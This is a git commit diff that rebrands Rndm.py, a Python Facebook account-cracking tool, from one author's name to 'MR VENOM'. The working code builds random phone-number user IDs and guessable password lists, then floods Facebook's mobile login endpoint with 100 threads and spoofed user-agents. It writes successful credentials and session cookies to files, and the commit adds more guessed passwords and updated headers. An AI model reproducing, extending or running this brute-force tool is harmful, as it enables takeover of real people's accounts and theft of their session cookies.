83a118be8002943fe51b9d1041cf4df94869ebcb
MR VENOM <140877479+Mrvenom01@users.noreply.github.com>
2023-08-30 13:28:46 +0600

    Rndm.py

--- Rndm.py
+++ Rndm.py
@@ -33,8 +33,8 @@ for tg in range(5000):
 	f=random.randrange(3000,6000)
 	g=random.randrange(20,100)
 	h='Mobile Safari/537.36'
-	turag=(f"{a} {b}; {c}{d}.{e}.{f}.{g} {h}")
-	ugen.append(turag)
+	venom=(f"{a} {b}; {c}{d}.{e}.{f}.{g} {h}")
+	ugen.append(venom)
 for ua in range(5000):
       a='Mozilla/5.0 (Linux; Android'
       b=random.choice(['5.1.1' , '6.0.1' , '7.1.1' , '12' , '13' , '14' , '15'])
@@ -78,19 +78,17 @@ for sat in range(1000):
     uaku2=f'{a}{b}{c}{d}{e}{f}{g}{h}{i}{j}{k}{l}'
     ugen.append(uaku2)
 logo=("""
-\x1b[1;90m└━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┑
-\x1b[1;90m┃  \033[1;91md888888b db    db d8888b.  .d8b.   d888b   \x1b[1;90m ┃
-\x1b[1;90m┃  \033[1;32m`~~88~~' 88    88 88  `8D d8' `8b 88' Y8   \x1b[1;90m ┃
-\x1b[1;90m┃  \033[1;92m   88    88    88 88oobY' 88ooo88 88  \x1b[1;90m      ┃
-\x1b[1;90m┃  \033[1;33m   88    88    88 88`8b   88~~~88 88  ooo  \x1b[1;90m ┃
-\x1b[1;90m┃  \033[1;93m   88    88b  d88 88 `88. 88   88 88. ~8~   \x1b[1;90m┃
-\x1b[1;90m┃  \033[1;36m   YP    ~Y8888P' 88   YD YP   YP  Y888P   \x1b[1;90m ┃
-\x1b[1;90m└━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┘
+\x1b[1;90m██╗░░░██╗███████╗███╗░░██╗░█████╗░███╗░░░███╗
+\x1b[1;90m██║░░░██║██╔════╝████╗░██║██╔══██╗████╗░████║
+\x1b[1;90m╚██╗░██╔╝█████╗░░██╔██╗██║██║░░██║██╔████╔██║
+\x1b[1;90m░╚████╔╝░██╔══╝░░██║╚████║██║░░██║██║╚██╔╝██║
+\x1b[1;90m░░╚██╔╝░░███████╗██║░╚███║╚█████╔╝██║░╚═╝░██║
+\x1b[1;90m░░░╚═╝░░░╚══════╝╚═╝░░╚══╝░╚════╝░╚═╝░░░░░╚═╝
 \033[1;96m═════════════════════════════════════════════
-\x1b[1;36m{+} \x1b[1;91mTOOL CREATED BY   \x1b[1;97m: TURAG AHAMED
-\x1b[1;36m{+} \x1b[1;92mGITHUB NAME       \x1b[1;97m: \x1b[1;94mTURAG-CYBER-404
-\x1b[1;36m{+} \x1b[1;93mTOOL / \x1b[1;92mSTATUS    \x1b[1;97m : \x1b[1;93mRANDOM / \x1b[1;92mACTIVE
-\x1b[1;36m{+} \x1b[1;90mTOOL VIRSION      \x1b[1;97m: \x1b[1;90m1.0.0
+\x1b[1;36m{+} \x1b[1;91mTOOL CREATED BY   \x1b[1;97m: MR VENOM
+\x1b[1;36m{+} \x1b[1;92mGITHUB NAME       \x1b[1;97m: \x1b[1;94mMrvenom01
+\x1b[1;36m{+} \x1b[1;93mTOOL / \x1b[1;92mSTATUS    \x1b[1;97m : \x1b[1;93mRANDOM / \x1b[1;90mACTIVE
+\x1b[1;36m{+} \x1b[1;90mTOOL VERSION     \x1b[1;97m: \x1b[1;36m1.0.0
 \033[1;96m═════════════════════════════════════════════
 """)
 A = '\x1b[1;97m' 
@@ -118,20 +116,20 @@ def fuck():
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(4))
         user.append(nmp)
-    with ThreadPool(max_workers=100) as turag:
+    with ThreadPool(max_workers=100) as venom:
         os.system('clear')
         print(logo)
-        os.system('xdg-open https://www.facebook.com/profile.php?id=100093241763897')
+        os.system('xdg-open https://www.facebook.com/profile.php?id=Rowdybrandx')
         tl = str(len(user))
         print('\033[1;37m[\033[1;32m✓\033[1;32m] SIM CODE : '+nude)
         print('\033[1;37m[\033[1;32m✓\033[1;32m] SOME ID,S WAS LOCKED ')
-        print('\033[1;37m[\033[1;32m✓\033[1;32m] TOOL CREATED BY TURAG JOIN MY GROUP ')
+        print('\033[1;37m[\033[1;32m✓\033[1;32m] TOOL CREATED BY MR VENOM JOIN MY GROUP ')
         print('\033[1;37m[\033[1;32m✓\033[1;32m] TOTAL ID : '+tl)
         print('\033[1;32m─────────────────────────────────────────────────────────')
         for guru in user:
             uid = nude+nudex+nud+guru
-            pwx = [nude+nudex+nud+guru,nud+guru,nudex+guru,nude+nudex+nud,'bangla']
-            turag.submit(rcrack,uid,pwx,tl)
+            pwx = [nude+nudex+nud+guru,nud+guru,nudex+guru,nude+nudex+nud,'bangla','112255','09876543','123412','00009999']
+            venom.submit(rcrack,uid,pwx,tl)
     print('\033[1;32m─────────────────────────────────────────────────────────')
     print('\033[1;37m[\033[1;32m~\033[1;37m] CRACK SUCCESSFULLY COMPLETED..')
     print('\033[1;32m─────────────────────────────────────────────────────────')
@@ -145,7 +143,7 @@ def rcrack(uid,pwx,tl):
             pro = random.choice(ugen)
             session = requests.Session()
             bi = random.choice([A,B,C,D,E,F,G,H])
-            sys.stdout.write(f'\r \033[1;31m[%sTURAG\033[1;31m]\033[1;34m\033[1;31m[\033[38;5;195m%s/%s\033[1;31m]\033[1;34m\033[38;5;45mOK-\033[38;5;46m%s\r'%(bi,loop,tl,len(oks))),
+            sys.stdout.write(f'\r \033[1;31m[%sVENOM\033[1;31m]\033[1;34m\033[1;31m[\033[38;5;195m%s/%s\033[1;31m]\033[1;34m\033[38;5;45mOK-\033[38;5;46m%s\r'%(bi,loop,tl,len(oks))),
             sys.stdout.flush()
             free_fb = session.get('https://free.facebook.com').text
             log_data = {
@@ -158,42 +156,42 @@ def rcrack(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = { 'authority': 'mbasic.facebook.com',
-    'method': 'GET',
-    'scheme': 'https', 
-    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'en-US,en;q=0.9',
-    'cache-control': 'max-age=0',
-    'content-type': 'application/x-www-form-urlencoded',
-    'origin': 'https://t.facebook.com',
-    'referer': 'https://t.facebook.com/',
-    'sec-ch-prefers-color-scheme': 'light',
-    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
-    'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
-    'sec-ch-ua-mobile': '?0',
-    'sec-ch-ua-platform': '"Linux"',
-    'sec-ch-ua-platform-version': '""',
-    'sec-fetch-dest': 'document',
-    'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'same-origin',
-    'sec-fetch-user': '?1',
-    'upgrade-insecure-requests': '1',
-    'user-agent': pro,
-    'viewport-width': '980',}
-            lo = session.post('https://free.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
+            header_freefb = { 'authority': 'm.facebook.com',
+            'method': 'GET',
+            'scheme': 'https', 
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-language': 'en-US,en;q=0.9',
+            'cache-control': 'max-age=0',
+            # 'cookie': 'datr=Y-7uZFG0GUlj4TPqdjCBYG-v; sb=Y-7uZGILVAggCTLlTa7rzkwp; m_pixel_ratio=1.712499976158142; wd=421x812; fr=0UJBTWfwgn2uF4iit..Bk7u5j.ro.AAA.0.0.Bk7u5q.AWXthkUvsFE',
+            'dpr': '1.712499976158142',
+            'sec-ch-prefers-color-scheme': 'light',
+            'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
+            'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.58"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-model': '"Infinix X688B"',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-ch-ua-platform-version': '"11.0.0"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'none',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
+            'viewport-width': '980',}
+            lo = session.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[65:80]
-                print(f"\033[38;5;46m[TURAG-OK💚] {uid} • {ps}" '  \n\033[1;33m [💉]\033[1;33mCookie = \033[1;32m'+coki+  ' \n\033[1;33m [🤧] \033[1;32mUa = \033[1;34m'+pro+'  \033[0;97m')
-                open('/sdcard/TURAG-OK.txt', 'a').write( uid+' | '+ps+'\n')
+                print(f"\033[38;5;46m[VENOM-OK🖤] {uid} • {ps}" '  \n\033[1;33m [💉]\033[1;33mCookie = \033[1;32m'+coki+  ' \n\033[1;33m [🤧] \033[1;32mUa = \033[1;34m'+pro+'  \033[0;97m')
+                open('/sdcard/VNM-CMD-OK.txt', 'a').write( uid+' | '+ps+'\n')
                 oks.append(uid)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[82:97]
-               #  print(f"\x1b[38;5;196m[TURAG-CP💔] {uid} • {ps}")
-                open('/sdcard/TURAG-CP.txt', 'a').write( uid+' | '+ps+' \n')
+               #  print(f"\x1b[38;5;196m[VENOM-CP💔] {uid} • {ps}")
+                open('/sdcard/VNM-CMD-CP.txt', 'a').write( uid+' | '+ps+' \n')
                 cps.append(uid)
                 break
             else:
